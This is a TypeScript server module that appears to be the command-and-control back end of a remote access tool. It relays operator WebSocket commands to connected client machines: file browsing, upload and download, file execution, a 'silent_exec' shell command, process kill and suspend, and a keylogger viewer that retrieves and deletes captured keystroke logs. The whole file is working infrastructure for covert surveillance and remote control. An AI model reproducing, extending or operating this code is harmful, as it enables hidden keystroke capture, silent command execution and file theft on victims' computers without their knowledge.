import type { ServerWebSocket } from "bun";
import { decode as msgpackDecode, encode as msgpackEncode } from "@msgpack/msgpack";
import { v4 as uuidv4 } from "uuid";
import { AuditAction, logAudit } from "../auditLog";
import * as clientManager from "../clientManager";
import { logger } from "../logger";
import { metrics } from "../metrics";
import { encodeMessage } from "../protocol";
import * as sessionManager from "../sessions/sessionManager";
import type { SocketData } from "../sessions/types";
import { normalizeFileUploadPayload } from "../fileTransfers";
import { canUserAccessClient } from "../users";

type FileBrowserViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

type ProcessViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

type WsViewerClusterDeps = {
  pendingHttpDownloads: Map<string, unknown>;
  consumeHttpDownloadPayload: (payload: any) => Promise<void> | void;
};

const fileBrowserCommandSessions = new Map<string, string>();

function trackFileBrowserCommand(commandId: string, sessionId: string): void {
  fileBrowserCommandSessions.set(commandId, sessionId);
  setTimeout(() => fileBrowserCommandSessions.delete(commandId), 10 * 60 * 1000);
}

function decodeViewerPayload(raw: string | ArrayBuffer | Uint8Array): any | null {
  if (typeof raw === "string") {
    try {
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }
  try {
    const buf = raw instanceof Uint8Array ? raw : new Uint8Array(raw);
    return msgpackDecode(buf);
  } catch {
    return null;
  }
}

function safeSendViewer(ws: ServerWebSocket<SocketData>, payload: unknown) {
  try {
    ws.send(msgpackEncode(payload));
  } catch (err) {
    logger.error("[viewer] send failed", err);
  }
}

export function handleFileBrowserViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session: FileBrowserViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addFileBrowserSession(session);
  ws.data.sessionId = sessionId;
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, clientUser: target?.user || "", clientOs: target?.os || "" });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleFileBrowserViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  logger.debug(`[DEBUG] File browser message from viewer for client ${clientId}:`, payload.type, payload.commandType || "");

  const target = clientManager.getClient(clientId);
  if (!target) {
    logger.debug(`[DEBUG] Client ${clientId} not found - sending offline status`);
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();

  if (payload.type === "command") {
    if (typeof payload.commandType !== "string") return;
    logger.debug(`[DEBUG] Handling command type: ${payload.commandType}`);
    const actualPayload = payload.payload || {};
    const routedId = payload.id || commandId;
    if (ws.data.sessionId) trackFileBrowserCommand(routedId, ws.data.sessionId);
    switch (payload.commandType) {
      case "file_read":
        logger.debug(`[DEBUG] Forwarding file_read to client ${clientId}:`, actualPayload.path);
        target.ws.send(encodeMessage({ type: "command", commandType: "file_read", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_read");
        break;
      case "file_write":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_write", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_write");
        break;
      case "file_search":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_search", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_search");
        break;
      case "file_copy":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_copy", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_copy");
        break;
      case "file_move":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_move", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_move");
        break;
      case "file_chmod":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_chmod", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_chmod");
        break;
      case "file_execute":
        logger.debug(`[DEBUG] Forwarding file_execute to client ${clientId}:`, actualPayload.path);
        target.ws.send(encodeMessage({ type: "command", commandType: "file_execute", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_execute");
        break;
      case "file_icon":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_icon", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_icon");
        break;
      case "file_thumb":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_thumb", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_thumb");
        break;
      case "file_dirsize":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_dirsize", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_dirsize");
        break;
      case "silent_exec":
        logger.debug(`[DEBUG] Forwarding silent_exec to client ${clientId}:`, actualPayload.command);
        target.ws.send(encodeMessage({ type: "command", commandType: "silent_exec", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("silent_exec");
        break;
      case "file_upload_http":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_upload_http", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_upload");
        logAudit({
          timestamp: Date.now(),
          username: (ws.data as any).username || "unknown",
          ip: ws.data.ip || "unknown",
          action: AuditAction.FILE_UPLOAD,
          targetClientId: clientId,
          details: JSON.stringify({ path: actualPayload.path || "", mode: "http_pull" }),
          success: true,
        });
        break;
      default:
        break;
    }
    return;
  }

  switch (payload.type) {
    case "file_list":
      if (ws.data.sessionId) trackFileBrowserCommand(commandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_list", id: commandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_list");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_LIST,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    case "file_download":
      if (ws.data.sessionId) trackFileBrowserCommand(commandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_download", id: commandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_download");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_DOWNLOAD,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    case "file_upload": {
      const upload = normalizeFileUploadPayload(payload);
      if (!upload) return;
      safeSendViewer(ws, {
        type: "file_upload_result",
        commandId,
        transferId: upload.transferId,
        path: upload.path,
        ok: false,
        error: "chunked uploads are disabled; refresh and retry",
      });
      break;
    }
    case "file_delete": {
      const deleteCommandId = payload.commandId || commandId;
      if (ws.data.sessionId) trackFileBrowserCommand(deleteCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_delete", id: deleteCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_delete");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_DELETE,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "file_mkdir": {
      const mkdirCommandId = payload.commandId || commandId;
      if (ws.data.sessionId) trackFileBrowserCommand(mkdirCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_mkdir", id: mkdirCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_mkdir");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_MKDIR,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "file_zip": {
      const zipCommandId = payload.commandId || commandId;
      if (ws.data.sessionId) trackFileBrowserCommand(zipCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_zip", id: zipCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_zip");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_ZIP,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "command_abort":
      target.ws.send(encodeMessage({ type: "command_abort", commandId: payload.commandId } as any));
      break;
    default:
      break;
  }
}

export function handleFileBrowserMessage(clientId: string, payload: any, deps: WsViewerClusterDeps) {
  const type = payload?.type as string | undefined;
  const isHttpDownload =
    type === "file_download" &&
    typeof payload?.commandId === "string" &&
    deps.pendingHttpDownloads.has(payload.commandId);

  if (type === "file_download" && typeof payload?.commandId === "string") {
    void deps.consumeHttpDownloadPayload(payload);
  }

  const payloadCommandId = typeof payload?.commandId === "string" ? payload.commandId : undefined;
  const ownerSessionId = payloadCommandId ? fileBrowserCommandSessions.get(payloadCommandId) : undefined;

  let hasSession = false;
  for (const session of sessionManager.getFileBrowserSessionsByClient(clientId)) {
    if (!hasSession) {
      hasSession = true;
      if (type && type !== "command_result" && type !== "command_progress") {
        logger.debug(`[filebrowser] client=${clientId} type=${type}`);
      }
    }
    if (isHttpDownload) {
      continue;
    }
    if (ownerSessionId && session.id !== ownerSessionId) {
      continue;
    }
    if (payload.type === "file_download" && payload.data) {
      const data = payload.data instanceof Uint8Array ? payload.data : new Uint8Array(payload.data);
      safeSendViewer(session.viewer, { ...payload, data });
    } else if (payload.type === "file_icon_result" && Array.isArray(payload.icons)) {
      const icons = payload.icons.map((item: any) => {
        if (item && item.png && !(item.png instanceof Uint8Array)) {
          return { ...item, png: new Uint8Array(item.png) };
        }
        return item;
      });
      safeSendViewer(session.viewer, { ...payload, icons });
    } else if (payload.type === "file_thumb_result" && Array.isArray(payload.thumbs)) {
      const thumbs = payload.thumbs.map((item: any) => {
        if (item && item.jpeg && !(item.jpeg instanceof Uint8Array)) {
          return { ...item, jpeg: new Uint8Array(item.jpeg) };
        }
        return item;
      });
      safeSendViewer(session.viewer, { ...payload, thumbs });
    } else {
      safeSendViewer(session.viewer, payload);
    }
  }
}

export function handleProcessViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session: ProcessViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addProcessSession(session);
  ws.data.sessionId = sessionId;
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleProcessViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();
  switch (payload.type) {
    case "process_list":
      target.ws.send(encodeMessage({ type: "command", commandType: "process_list", id: commandId } as any));
      metrics.recordCommand("process_list");
      break;
    case "process_kill": {
      const pid = Number(payload.pid);
      if (!Number.isFinite(pid) || pid <= 0) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid PID" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "process_kill", id: commandId, payload: { pid } } as any));
      metrics.recordCommand("process_kill");
      break;
    }
    case "process_suspend": {
      const pid = Number(payload.pid);
      if (!Number.isFinite(pid) || pid <= 0) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid PID" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "process_suspend", id: commandId, payload: { pid } } as any));
      metrics.recordCommand("process_suspend");
      break;
    }
    case "process_resume": {
      const pid = Number(payload.pid);
      if (!Number.isFinite(pid) || pid <= 0) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid PID" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "process_resume", id: commandId, payload: { pid } } as any));
      metrics.recordCommand("process_resume");
      break;
    }
    default:
      break;
  }
}

export function handleProcessMessage(clientId: string, payload: any) {
  for (const session of sessionManager.getProcessSessionsByClient(clientId)) {
    safeSendViewer(session.viewer, payload);
  }
}

export function handleKeyloggerViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addKeyloggerSession(session);
  ws.data.sessionId = sessionId;
  logger.info(`[keylogger] viewer connected session=${sessionId} client=${clientId}`);
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleKeyloggerViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();
  switch (payload.type) {
    case "keylog_list":
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_list", id: commandId } as any));
      metrics.recordCommand("keylog_list");
      break;
    case "keylog_retrieve": {
      const filename = typeof payload.filename === "string" ? payload.filename : "";
      if (!filename) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid filename" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_retrieve", id: commandId, payload: { filename } } as any));
      metrics.recordCommand("keylog_retrieve");
      break;
    }
    case "keylog_clear_all":
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_clear_all", id: commandId } as any));
      metrics.recordCommand("keylog_clear_all");
      break;
    case "keylog_delete": {
      const filename = typeof payload.filename === "string" ? payload.filename : "";
      if (!filename) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid filename" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_delete", id: commandId, payload: { filename } } as any));
      metrics.recordCommand("keylog_delete");
      break;
    }
    default:
      break;
  }
}

export function handleKeyloggerMessage(clientId: string, payload: any) {
  for (const session of sessionManager.getKeyloggerSessionsByClient(clientId)) {
    safeSendViewer(session.viewer, payload);
  }
}
